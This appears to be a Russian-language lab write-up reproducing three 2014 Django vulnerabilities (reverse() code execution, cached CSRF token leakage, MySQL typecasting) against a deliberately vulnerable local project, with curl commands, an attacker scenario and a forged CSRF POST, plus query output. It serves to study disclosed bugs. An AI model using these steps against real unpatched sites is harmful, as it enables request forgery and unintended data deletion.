## Source URL

https://www.djangoproject.com/weblog/2014/apr/21/security/

```
$ pip install Django==1.6.2 MySQL-python==1.2.5
$ django-admin.py startproject vulnerable
```

## Issue: Unexpected code execution using reverse() ##

	$ curl localhost:8000

	       /\     /\
	      {  `---'  }
	      {  O   O  }  
	    ~~|~   V   ~|~~  
	       \  \|/  /   
	        `-----'__
	        /     \  `^\_
	       {       }\ |\_\_   W
	       |  \_/  |/ /  \_\_( )
	        \__/  /(_E     \__/
	          (  /
	           MM


	$ curl localhost:8000?next=pwn.own

	                     .ed"""" """$$$$be.
	                   -"           ^""**$$$e.
	                 ."                   '$$$c
	                /                      "4$$b
	               d  3                      $$$$
	               $  *                   .$$$$$$
	              .$  ^c           $$$$$e$$$$$$$$.
	              d$L  4.         4$$$$$$$$$$$$$$b
	              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
	  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
	 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
	4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
	^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
	  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
	        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
	          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
	             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
	               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
	                  "$   "%*ebJLzb$e$$$$$b $P"
	                    %..      4$$$$$$$$$$ "
	                     $$$e   z$$$$$$$$$$%
	                      "*$c  "$$$$$$$P"
	                       ."""*$$$$$$$$bc
	                    .-"    .$***$$$"""*e.
	                 .-"    .e$"     "*$c  ^*b.
	          .=*""""    .e$*"          "*bc  "*$e..
	        .$"        .z*"               ^*$e.   "*****e.
	        $$ee$c   .d"                     "*$.        3.
	        ^*$E")$..$"                         *   .ee==d%
	           $.d$$$*                           *  J$$$e*
	            """""                              "$$$"

## Issue: Caching of anonymous pages could reveal CSRF token ##

### Анатомия уязвимости

	$ curl -I localhost:8000/login/
	HTTP/1.0 200 OK
	Date: Sun, 04 May 2014 14:58:59 GMT
	Server: WSGIServer/0.1 Python/2.7.6
	Expires: Sun, 04 May 2014 15:07:25 GMT
	Vary: Cookie
	Last-Modified: Sun, 04 May 2014 14:57:25 GMT
	Cache-Control: max-age=600
	X-Frame-Options: SAMEORIGIN
	Content-Type: text/html; charset=utf-8
	Set-Cookie:  csrftoken=EbLMgjQ9g62hzmeaEovXkhhqwIQmKst1; expires=Sun, 03-May-2015 14:57:24 GMT; Max-Age=31449600; Path=/

### Пример

0. Пример кода с view

1. Представим ситуацию. Жертва - постоянный анонимный пользователь сайта.
```
$ curl localhost:8000/boom/
7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc
```

2. У злоумышленника есть сайт и механизм(бот), который ходит на сайт жертвы и получает куки анонимов из кэша

3. (прил) пользователь заходит на сайт злоумышленника и там выполняется AJAX запрос аналогичный
```
$ curl --request POST \
	--cookie "csrftoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
	--data "csrfmiddlewaretoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
	localhost:8000/boom/
BOOM!
```

## Issue: MySQL typecasting

Попытаемся разобраться о чем идет речь

	>>> query_obj = CVE_2014_0474_Blacklist.objects.filter(ip=192)
	>>> print query_obj.query
	SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192 

	mysql> SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192.168;
	+----+---------------+
	| id | ip            |
	+----+---------------+
	|  2 | 192.168.0.1   |
	|  3 | 192.168.83.17 |
	+----+---------------+
	2 rows in set, 3 warnings (0,01 sec)

Варианты использования:
У злоумышленника появился доступ к очереди celery.
Celery сериализует аргументы функций. Можно сериализовать число туда, где приложение ожидает строку.

	>>> query_obj.delete()
	Traceback (most recent call last):
	  File "<console>", line 1, in <module>
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/query.py", line 465, in delete
	    collector.delete()
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/deletion.py", line 260, in delete
	    qs._raw_delete(using=self.using)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/query.py", line 476, in _raw_delete
	    sql.DeleteQuery(self.model).delete_qs(self, using)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/sql/subqueries.py", line 85, in delete_qs
	    self.get_compiler(using).execute_sql(None)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/sql/compiler.py", line 782, in execute_sql
	    cursor.execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/util.py", line 69, in execute
	    return super(CursorDebugWrapper, self).execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/util.py", line 53, in execute
	    return self.cursor.execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/mysql/base.py", line 124, in execute
	    return self.cursor.execute(query, args)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/MySQLdb/cursors.py", line 207, in execute
	    if not self._defer_warnings: self._warning_check()
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/MySQLdb/cursors.py", line 117, in _warning_check
	    warn(w[-1], self.Warning, 3)
	Warning: Truncated incorrect DOUBLE value: '127.0.0.1                                    '

	mysql> SHOW WARNINGS;
	+---------+------+-----------------------------------------------------------------------------------+
	| Level   | Code | Message                                                                           |
	+---------+------+-----------------------------------------------------------------------------------+
	| Warning | 1292 | Truncated incorrect DOUBLE value: '127.0.0.1                                    ' |
	| Warning | 1292 | Truncated incorrect DOUBLE value: '192.168.0.1                                  ' |
	| Warning | 1292 | Truncated incorrect DOUBLE value: '192.168.83.17                                ' |
	+---------+------+-----------------------------------------------------------------------------------+
	3 rows in set (0,00 sec)
